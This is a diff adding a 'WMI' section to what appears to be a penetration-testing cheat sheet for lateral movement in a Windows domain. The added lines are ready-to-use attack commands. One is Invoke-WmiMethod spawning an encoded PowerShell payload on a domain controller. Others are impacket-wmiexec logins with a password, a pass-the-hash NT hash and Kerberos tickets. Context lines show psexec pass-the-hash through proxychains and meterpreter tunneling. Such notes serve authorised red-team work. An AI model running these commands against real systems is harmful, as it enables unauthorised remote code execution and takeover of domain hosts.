@@ -28,6 +28,14 @@ proxychains -q python examples/psexec.py sql07/Administrator@172.16.184.152 -has
 proxychains -q python examples/psexec.py Administrator@172.16.184.151 -hashes aad3b435b51404eeaad3b435b51404ee:[NTHash]
 ```
 
+### WMI
+```
+Invoke-WmiMethod win32_process -ComputerName dc.targetdomain.com -name create -argumentlist "powershell.exe -e $encodedCommand"
+impacket-wmiexec DOMAIN/targetuser:password@172.16.4.101
+impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -hashes :[NTHash]
+impacket-wmiexec DOMAIN/targetuser@172.16.4.101 -no-pass -k
+```
+
 ### Tunneling
 ```
 # SOCKS5 using meterpreter
